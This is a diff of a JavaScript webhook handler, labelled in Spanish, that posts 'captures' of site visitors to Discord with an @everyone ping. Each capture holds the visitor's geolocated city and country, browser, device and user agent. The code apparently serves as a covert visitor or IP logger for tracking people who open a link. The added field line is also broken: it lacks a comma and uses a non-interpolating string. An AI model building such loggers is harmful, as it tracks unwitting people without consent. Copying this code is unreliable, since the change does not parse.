@@ -41,7 +41,7 @@ module.exports = async function handler(req, res) {
   } catch {}
 
   const embed = {
-    title: `📡 CAPTURA · PÚBLICO · ${endpoint}`,
+    title: `📡 CAPTURA PÚBLICA`,
     color: 0x2ecc71,
     fields: [
       { name: "📍 Ubicación", value: `${geo.city || "Desconocida"}, ${geo.country || "Desconocido"}`, inline: false },
@@ -50,6 +50,7 @@ module.exports = async function handler(req, res) {
       { name: "🌍 Navegador", value: browser, inline: false },
       { name: "🖥️ Tipo", value: device, inline: false },
       { name: "📜 User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
+      { name: "📌 Endpoint", value: "${endpoint}"}
     ],
     footer: {
       text: `Público - ${endpoint} · ${new Date().toLocaleString()}`
@@ -58,9 +59,8 @@ module.exports = async function handler(req, res) {
   };
 
   const payload = {
-    content: `🚨 @everyone NUEVA CAPTURA: ${endpoint} 🚨`,
+    content: `@everyone`,
     allowed_mentions: { parse: ["everyone"] },
-    username: "Public Logger",
     embeds: [embed]
   };
 
